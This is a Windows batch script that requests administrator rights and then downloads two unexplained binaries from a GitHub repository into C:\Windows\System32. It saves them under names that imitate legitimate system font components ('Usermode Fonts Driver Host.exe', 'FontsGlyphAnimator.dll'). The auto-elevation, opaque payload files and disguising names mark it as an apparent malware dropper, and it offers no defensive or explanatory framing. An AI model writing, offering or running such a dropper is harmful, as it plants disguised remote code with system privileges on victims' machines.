@echo off
:: Auto-elevate if not running as admin
net session >nul 2>&1
if not %errorLevel%==0 (
    echo [!] Requesting administrator access...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit
)

echo [*] Downloading files to C:\Windows\System32 ...

:: === File 1 ===
set "URL1=https://github.com/BLACK89310/sMOD/raw/refs/heads/main/000"
set "NAME1=Usermode Fonts Driver Host.exe"

:: === File 2 ===
set "URL2=https://github.com/BLACK89310/sMOD/raw/refs/heads/main/dddddd"
set "NAME2=FontsGlyphAnimator.dll"




:: === DESTINATION FOLDER ===
set "DEST=C:\Windows\System32"

:: === Function to Download ===
powershell -Command "Invoke-WebRequest -Uri '%URL1%' -OutFile '%DEST%\%NAME1%'"
powershell -Command "Invoke-WebRequest -Uri '%URL2%' -OutFile '%DEST%\%NAME2%'"


:: === Verify ===
echo.
echo [*] Downloaded files:
if exist "%DEST%\%NAME1%" echo [✓] %NAME1%
if exist "%DEST%\%NAME2%" echo [✓] %NAME2%


echo.
echo [?] All files downloaded and saved to System32!
pause
